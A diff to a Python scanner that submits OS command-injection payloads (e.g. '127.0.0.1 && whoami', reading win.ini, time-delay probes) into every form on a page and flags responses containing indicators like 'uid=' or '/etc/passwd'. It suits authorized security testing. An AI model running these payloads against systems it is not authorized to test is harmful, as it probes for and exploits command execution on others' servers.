@@ -1,6 +1,6 @@
 import requests
-# from flask import request
 from bs4 import BeautifulSoup
+from urllib.parse import urljoin
 
 payloads = [
     "127.0.0.1 && whoami",
@@ -13,14 +13,12 @@ payloads = [
     "127.0.0.1 `whoami`",  
     "127.0.0.1 && echo vulnerable",
     "127.0.0.1 && sleep 5",  # time delay (blind injection)
-
     "127.0.0.1 & whoami",
     "127.0.0.1 & dir",
     "127.0.0.1 & echo vulnerable",
     "127.0.0.1 & type C:\\Windows\\win.ini",
     "127.0.0.1 | whoami",
     "127.0.0.1 & timeout 5",  # time delay (Windows)
-
     "127.0.0.1%26%26whoami",    # && URL encoded
     "127.0.0.1%3Bwhoami",       # ; URL encoded
     "127.0.0.1%7Cwhoami",       # | URL encoded
@@ -28,63 +26,63 @@ payloads = [
 ]
 
 keywords = [
-    "root",              # common in Unix 'whoami' output
-    "uid=",              # from `id` command
-    "gid=",              # also from `id`
-    "Linux",             # from `uname` or environment
-    "Windows",           # Windows command output
-    "C:\\",              # Windows file system
-    "/bin/bash",         # system shell location
-    "command not found", # partially executed input
-    "No such file",      # command executed with wrong args
-    "Syntax error",      # shell-level error
+    "root", "uid=", "gid=", "Linux", "Windows", "C:\\", "/bin/bash",
+    "No such file", "/etc/passwd", "command not found", "sh:",
+    "system32", "admin", "whoami", "echo vulnerable"
 ]
 
-results = {}
 
 def check_cmd_injection(url):
-    page = requests.get(url, timeout=5)
+    results = {}
+
+    try:
+        page = requests.get(url, timeout=5)
+        page.raise_for_status()
+    except requests.RequestException as e:
+        print(f"Error accessing page: {e}")
+        return
+
     soup = BeautifulSoup(page.text, "lxml")
-    form = soup.find("form")
-    if not form:
+    forms = soup.find_all("form")
+    if not forms:
         print("No form found on the page.")
         return
-    action = form.get("action", "")
-    method = form.get("method", "get").lower()
-    base_Url = url.rstrip('/')
-    inputs = form.find_all("input")
-    
-    submit_url = ""
-    if(action.startswith("http")):
-        submit_url = action
-    else:
-        submit_url = base_Url + "/" + action.lstrip("/")
 
-    for load in payloads:
-        data = {}
-        for input_tag in inputs:
-            name = input_tag.get("name")
-            if name:
-                data[name] = load
+    for form in forms:
+        action = form.get("action", "")
+        method = form.get("method", "get").lower()
+        submit_url = urljoin(url, action)
 
-        if(method == "post"):
-            response = requests.post(submit_url, data=data, timeout=7)
-        else:
-            response = requests.get(submit_url, params=data, timeout=7)
-        
-        if(response.status_code == 200):
-            response_text = response.text
-            is_present = False
-            for i in keywords:
-                if(i.lower() in response_text.lower()):
-                    is_present = True
-                    break
+        inputs = form.find_all("input")
 
-            if(is_present):
-                results.update({load : "Yes"})
+        for load in payloads:
+            data = {}
+            for input_tag in inputs:
+                name = input_tag.get("name")
+                if name and input_tag.get("type") != "submit": #so that it doesnt put payload in submit field
+                    data[name] = load
+
+            try:
+                if method == "post":
+                    response = requests.post(submit_url, data=data, timeout=7)
+                else:
+                    response = requests.get(submit_url, params=data, timeout=7)
+            except requests.RequestException as e:
+                results[load] = f"Error: {e}"
+                continue
+
+            if response.status_code == 200:
+                response_text = response.text
+                isPresent = False
+                for i in keywords:
+                    if(i.lower() in response_text.lower()):
+                        isPresent = True
+                        break
+                if(isPresent):
+                    results[load]="Potential Vulnerability"
+                else:
+                    results[load]="No"        
             else:
-                results.update({load : "No"})
-        else:
-            results.update({load: f"Error: {response.status_code}"})
+                results[load] = f"Error: {response.status_code}"
 
     return results
